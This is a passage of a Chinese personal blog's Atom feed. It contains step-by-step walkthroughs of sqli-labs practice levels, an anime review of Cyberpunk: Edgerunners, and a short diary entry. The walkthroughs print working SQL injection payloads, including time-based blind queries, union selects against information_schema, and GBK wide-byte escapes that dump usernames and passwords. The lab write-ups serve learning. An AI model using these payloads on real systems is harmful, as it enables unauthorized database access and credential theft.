class="line">?sort=-1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database()) limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li></ol><h2 id="第49关"><a href="#第49关" class="headerlink" title="第49关"></a>第49关</h2><p>与第48关相比差不多，只是闭合方式为’</p><h2 id="第50关"><a href="#第50关" class="headerlink" title="第50关"></a>第50关</h2><p>与第48关相比差不多，因为源码中存在mysqli_multi_query,可以堆叠注入</p><h2 id="第51关"><a href="#第51关" class="headerlink" title="第51关"></a>第51关</h2><p>与第50关相比差不多，只是闭合方式为’</p><h2 id="第52关"><a href="#第52关" class="headerlink" title="第52关"></a>第52关</h2><p>与第50关相比差不多</p><h2 id="第53关"><a href="#第53关" class="headerlink" title="第53关"></a>第53关</h2><p>与第51关相比差不多</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>常规操作</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;久违的盲注&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs_54-57</title>
    <link href="http://example.com/2022/11/19/sqli-labs_54-57/"/>
    <id>http://example.com/2022/11/19/sqli-labs_54-57/</id>
    <published>2022-11-18T16:00:00.000Z</published>
    <updated>2022-11-19T13:44:05.053Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识基本都已经学完了，从这里开始就是训练了。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试并判断注入类型<br>就像回到了开始~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1  显示正常</span><br><span class="line">?id=1&#x27;  无错误信息，但显示不正常</span><br></pre></td></tr></table></figure><p>推测闭合方式为’</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 4 --+  无错误信息，但显示不正常</span><br><span class="line">?id=1&#x27;order by 3 --+  显示正常</span><br></pre></td></tr></table></figure><p>字段数为3</p></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenages&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;8k8nkr7hq5&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(secret_2GAF),3 from 8k8nkr7hq5 --+</span><br></pre></td></tr></table></figure></li></ol><h2 id="第55关"><a href="#第55关" class="headerlink" title="第55关"></a>第55关</h2><p>与第54关差不多，闭合方式变更为)</p><h2 id="第56关"><a href="#第56关" class="headerlink" title="第56关"></a>第56关</h2><p>与第54关差不多，闭合方式变更为’)</p><h2 id="第57关"><a href="#第57关" class="headerlink" title="第57关"></a>第57关</h2><p>与第54关差不多，闭合方式变更为”</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>限制了次数的玩法还挺刺激的hh</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;知识基本都已经学完了，从这里开始就是训练了。&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>赛博朋克~边缘行者--渺小个人的癫狂悲剧</title>
    <link href="http://example.com/2022/11/19/%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B%E5%8A%A8%E7%94%BB/"/>
    <id>http://example.com/2022/11/19/%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B%E5%8A%A8%E7%94%BB/</id>
    <published>2022-11-18T16:00:00.000Z</published>
    <updated>2022-11-20T06:38:02.811Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Cyberpunk.png" alt="Cyberpunk"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Nexflix上九月份一口气播完的，我是等了一段时间，等风评落地才来看的。<br>虽说如此，这部仅有10集的动画我也看了一个月左右。终于今天把最后三集看完了。<br>知道这款游戏，但我没玩也没了解，一无所知没有被剧透来看这部动画，真是一种享受~</p><p><img src="/images/Lucy&David2.png" alt="Lucy&amp;David"></p><h1 id="色彩"><a href="#色彩" class="headerlink" title="色彩"></a>色彩</h1><p>先来聊聊这个吧，毕竟是能给人最直观感受的方式。<br><font color=Crimson>非常符合我心中对于赛博朋克世界的想象，单凭画面就能让我感受到那股<strong>荒诞离奇</strong>了。对于少有看日本动画的人而言，恐怕很轻易以为这是美国制作的动画吧。不仅如此，这样的画风还带来一个非常有利于动画剧情的好处，对于这样一个动作少不了的动画而言，这样的画风能够提供<strong>足够的张力</strong>。</font>可惜身边只有笔记本这样的小屏幕，如果有够大的屏幕，一定能完美地感受到动画洋溢出来的力量。</p><p><img src="/images/Lucy3.png" alt="Lucy"></p><h1 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h1><p>或许因为该游戏制作团队是欧美人，同时游戏设定在美国，动画投资者是Netflix，本作的音乐的确是更为偏向于欧美的风格。<font color=Darkorange>op的氛围倾向于<strong>毁灭</strong>，而ed则是一种<strong>悲剧</strong>的感觉。总之，音乐方面给足了暗示吧。如果说，片头片尾的音乐是符合整部动画气氛，那么最后一集的插曲，就是<strong>侧耳动听之余给人带来无限的悲伤</strong>吧。</font>当然，还有其它插曲，也很符合动画气氛，这里不再一一提起。<br>片头曲：This Fffire<br>片尾曲：Let You Down<br>动画插曲：I Really Want to Stay at Your House</p><p><img src="/images/kiss.png" alt="kiss"></p><h1 id="剧情"><a href="#剧情" class="headerlink" title="剧情"></a>剧情</h1><p><font color=DarkViolet>相较于传统日本动画，这一部动画仅有10集，这也造就了剧情异常紧凑，恰到好处地略去了那些不用解释观众也能自行领会的部分，各个转场不说浑然天成，也是毫无突兀感。从一开始较快的节奏，作了一点铺垫。慢慢地，剧情一点点加速，再也无法分出一点精力去注意外界杂讯。<strong>精彩绝伦</strong>谓之毫不为过。</font><br><font color=DarkRed>这绝不是好莱坞式爆米花电影，无论是画面音乐还是剧情，都堪称<strong>一流水准</strong>。倘如只是抱着轻松娱乐的心态来看这部动画，也并非不行，但我想恐怕只能收获肤浅简单的想法吧。面对这样一部一年或许仅有一部的短小精悍的动画佳作，岂不是太可惜了吗？</font></p><p><img src="/images/Lucy8.png" alt="Lucy"></p><h1 id="人物"><a href="#人物" class="headerlink" title="人物"></a>人物</h1><p>各个人物的塑造都十分生动形象，可见制作功底的有力。<br><font color=Magenta>若要问我哪个人物最喜欢，那无疑是<strong>丽贝卡(Rebecca)</strong>，萝莉身材，豪爽作风，平时个性嘻嘻哈哈疯疯癫癫，关键时刻可靠队友毫不含糊。喜欢着大卫(David)，却不因大卫喜欢露西(Lucy)而吃醋，处处关心与照顾大卫，是大卫唯一能托付的人。也因此，最后亚当重锤从天而降将丽贝卡杀害的时候我直接气得锤了桌子一下。老难受了啊！！！一直提心吊胆到最后，结果还是被杀了。亚当重锤，我要杀你一万次也不够！！！</font></p><p><img src="/images/Rebecca2.png" alt="Rebecca"></p><h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><font color=orange>无疑，这是一个极度资本化的世界，只要有钱，服务应有尽有。公安这些在资本面前不值一提，大公司的军事力量甚至能匹敌军队。大卫舍生去对抗公司，连公司的高层都无法触及。这部动画也能给未来的人带来一些警示吧。人的性命化为草芥，没有人在意。当沉浸于动画的时候，没有感觉到。当动画结束后，冷静下来，会发现，这部动画对于生命的处理如此简单以至于不会有人在看动画时缅怀逝去的生命，如大卫的母亲，丽贝卡的哥哥，曼恩(Marine)...或许有人认为是由于动画时长的因素，我想有这方面的因素，但有一个更重要的因素是，让人切身体会到夜之城的生命之轻，人的性命不值一提。大卫和他周围的同伴是反抗这个资本世界的人，他从底层来，用尽所有生命去反抗这不讲理又无解的世界。他们是有人性的人，所以讲义气，为同伴出生入死。他们是有人性的人，所以大卫杀死一个无辜的母亲会想到自己的母亲。也正因是有人性的人，所以最终会成为赛博精神病。于是，这样的人注定无法战胜冷血无情的公司，即资本。只要有人性就有弱点，从一开始便注定了失败的命运，何等悲哀！即便如此，他们也过了一段足够精彩的人生。书写了独属于他们的传奇。我想，即便再给他们一次机会，依然会做出这样的选择吧。</font><p><img src="/images/Lucy4.png" alt="Lucy"></p><h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p><font color=MidnightBlue>据说，夜之城没有活着的传奇。我见证了大卫这个传奇人物的短暂一生，我见证了大卫与露西的动人恋情，我见证了赛博朋克的义薄云天，我见证了夜之城吃掉了一个又一个梦想…<br>在没看赛博朋克之前，通过零星的言论，我得知这是一部悲剧。我脑海中一直以为会是女主角露西的死去，可结局却是，两人起初在假月球相会，约好一起去月球，最终只有露西一个人去了真月球。而这样一个传奇，最终也被夜之城所吞噬，活在了传说之中。<br>昨晚的感想<strong>普通与特别</strong>，在赛博朋克里也讨论到了。<br>的确，相比于只装了少数小量级义体的人和曼恩他们，大卫是特别的。可是相较于亚当重锤这样几乎全身义体的人而言，大卫所装的沙德威斯坦只是入门级义体，那么大卫也只能算是普通人，承受不住改造金刚的压力。<br>其实普通与特别，只不过是相对之间，同时标准对于不同的人也是不同的，非常主观。我想每个人总有一点在周围人看来特别的部分吧，如果从里到外都是普通的，这样的人恐怕很少见，那其实也算特别吧。因此<strong>没必要纠结于普通或是特别，做自己就是最好</strong>。<br>在这个赛博朋克的世界里，要么堕落至深渊如尸体随处停放，要么过着安分守己的生活一辈子扫清尘土，要么让生命光辉灿烂在一瞬间达到永恒。或许现实世界也是一样，可在这个世界，对比就异常明显了。我们的世界，未来会这样吗？<strong>是否能见证赛博朋克的到来呢？</strong></font></p><p><img src="/images/Lucy2.png" alt="Lucy"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>过一两年，等剧情都忘得差不多的时候，把赛博朋克游戏买了吧。想必那时候又有全新的体验了，很有趣，不是吗？</p><p><img src="/images/Lucy5.png" alt="Lucy"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Cyberpunk.png&quot; alt=&quot;Cyberpunk&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="动画" scheme="http://example.com/categories/%E5%8A%A8%E7%94%BB/"/>
    
    <category term="赛博朋克" scheme="http://example.com/categories/%E5%8A%A8%E7%94%BB/%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B/"/>
    
    
    <category term="动画" scheme="http://example.com/tags/%E5%8A%A8%E7%94%BB/"/>
    
  </entry>
  
  <entry>
    <title>普通且自信</title>
    <link href="http://example.com/2022/11/18/Diary_1118/"/>
    <id>http://example.com/2022/11/18/Diary_1118/</id>
    <published>2022-11-17T16:00:00.000Z</published>
    <updated>2022-11-18T17:39:19.331Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B51.png" alt="犬山葵"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一天的学习还是挺充实的，平静的生活。</p><h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>长风破浪会有时，直挂云帆济沧海。</p><h1 id="行路难"><a href="#行路难" class="headerlink" title="行路难"></a>行路难</h1><p>这样的日子，独自的世界。<br>是枯燥的吗？是斑斓的吗？让人多想的时候，就不禁觉得，热情会被拉扯而消散。<br>还是少想一些吧，多做事。<br>今天突然想到了一个短语，大概是最近几年流行的？ 普通且自信<br>其实原本都没怎么在意过这个词，是被某人用在我身上贬我的时候，才注意到的。<br>似乎在网络上被人作为贬义而广泛使用。但其实，我个人而言，还蛮喜欢这个短语的。<br>说起来，什么是普通呢？<br>我想，当某人拥有某一方面的长处时，或许有人会认为他不普通。但这其实只是就这方面而言，其他不是长处的方面，不也很普通吗？<br>如果说，崭露头角的人是不普通的，那么衡量标准就成为了一个人在这世界上的名气，那岂不是“不普通”&#x3D;“名气大”吗？我也并不这么认为。<br>浅浅的思考了之后，给出一个暂时的答案吧。<br>我心中的不普通的人，一种是有智慧wisdom的人，另一种是在某一方面处于超脱常人（在整个世界上来衡量）的人。这后一种的不普通，就不一定是好的形容了。<br>自信，我认为在认为时候都不应当是贬义词，与自信相对的贬义词并不是没有：过度自信是自负，没有自信是自卑。</p><p>普通且自信，这个标签，也许还不错？<br>即便有人用这个词来贬我，我恐怕也只会报之一笑吧。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>每次碍于时间，想写什么，都不敢写深入，抽个时间，写点深刻的文字吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E7%8A%AC%E5%B1%B1%E8%91%B51.png&quot; alt=&quot;犬山葵&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs_32+33</title>
    <link href="http://example.com/2022/11/18/sqli-labs_32+33/"/>
    <id>http://example.com/2022/11/18/sqli-labs_32+33/</id>
    <published>2022-11-17T16:00:00.000Z</published>
    <updated>2022-11-18T09:51:44.802Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关涉及到了编码格式</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li>测试并判断注入类型<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;  发现被转义为了 1\&#x27;</span><br></pre></td></tr></table></figure>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>复习一下，<br>preg_replace()函数执行一个正则表达式的搜索和替换。详细：<a href="https://www.runoob.com/php/php-preg_replace.html">PHP preg_replace() 函数</a><br>preg_quote()函数用于转义正则表达式字符。详细：<a href="https://www.runoob.com/php/php-preg_quote.html">PHP preg_quote() 函数</a><br>因此，我们无法用单引号双引号闭合注入<br>但源码中还有一句引起了注意：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br></pre></td></tr></table></figure>这里表明是使用gbk编码，那么我们可以尝试使用宽字节注入。</li></ol><ul><li>当某字符的大小为一个字节时，称其字符为窄字节.</li><li>当某字符的大小为两个字节时，称其字符为宽字节.</li><li>所有英文默认占一个字节，汉字占两个字节</li><li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等<br>宽字节的格式是在地址后先加一个%df，再加单引号，因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字“連”，所以这时，单引号成功逃逸。<br>宽字节注入情况：</li><li>客户端、连接层、结果集 都是GBK编码</li><li>使用iconv进行字符集转换，将UTF-8转为GBK，同时，set names字符集为GBK。提交%e9%8c%a6即可。</li><li>使用set names UTF-8指定了UTF-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv函数（或者mb_convert_encoding）先转为UTF-8，然后再拼接入SQL语句。</li></ul><p>注意：<br>页面默认是utf-8，如果想看显示效果需要更改页面编码，我这里是用到了chrome的扩展商店的插件，具体可看下面这篇文章<br><a href="https://www.munue.com/172.html#:~:text=%E5%8F%B3%E9%94%AE%E7%82%B9%E5%87%BB%E5%9B%BE%E6%A0%87%EF%BC%8C%E6%89%93%E5%BC%80%E9%80%89%E9%A1%B9,%E8%BF%9B%E8%A1%8C%E9%80%89%E6%8B%A9%E5%92%8C%E8%AE%BE%E7%BD%AE%E7%BC%96%E7%A0%81%E3%80%82">Google Chrome 浏览器如何设置网页编码</a></p><p>最终，我们构造该语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure><p>页面显示效果如下<br><img src="/simg/sqli-labs_32.png" alt="显示效果"></p><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27;order by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(0x7e,id,0x7e,username,0x7e,password) from users) --+</span><br></pre></td></tr></table></figure></li></ol><h2 id="第33关"><a href="#第33关" class="headerlink" title="第33关"></a>第33关</h2><p>和第32关本质是一样的，只是源码用了addslashes()函数<br>addslashes()函数：addslashes() 函数返回在预定义的字符前添加反斜杠的字符串<br>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL<br>注入方式相同，这里不再重复</li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>学到了宽字节注入</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a><br><a href="https://blog.csdn.net/m0_62879498/article/details/122558222">sql-lab (32~35)包含对 宽字节注入的原理理解及注意事项</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本关涉及到了编码格式&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
</feed>
